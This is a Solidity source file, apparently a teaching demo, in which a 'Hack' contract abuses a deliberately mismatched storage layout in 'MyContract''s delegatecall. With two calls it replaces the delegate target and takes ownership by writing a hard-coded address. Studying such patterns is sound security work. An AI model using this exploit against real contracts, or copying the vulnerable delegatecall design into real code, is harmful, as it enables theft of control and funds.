// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Hack {
    address public otherContract; // 0

    uint public at; // 1
    address public sender; // 2

    address public owner; // 3

    MyContract public toHack;

    constructor(address _to) {
        toHack = MyContract(_to);
    }

    function attack() external {
        toHack.doDelCall(
            uint(
                uint160(
                    address(this)
                )
            )
        );
        toHack.doDelCall(0);
    }

    function getData(uint) external {
        owner = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C;
    }
}

contract MyContract {
    address public otherContract; // 0
    // 0xd2a5bC10698FD955D1Fe6cb468a17809A08fd005
    // 0x0fC5025C764cE34df352757e82f7B5c4Df39A836 -- hacker

    uint public at; // 1
    address public sender; // 2

    address public owner; // 3
    // 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4

    constructor(address _otherContract) {
        otherContract = _otherContract;
        owner = msg.sender;
    }

    function doDelCall(uint ts) external payable {
        (bool success,) = otherContract.delegatecall(
            abi.encodeWithSelector(
                AnotherContract.getData.selector,
                ts
            )
        );
        require(success);
    }
}

contract AnotherContract {
    uint public at; // 0
    address public sender; // 1

    event Received(address sender, uint ts);

    function getData(uint ts) external {
        at = ts;
        sender = msg.sender;
        emit Received(sender, at);
    }
}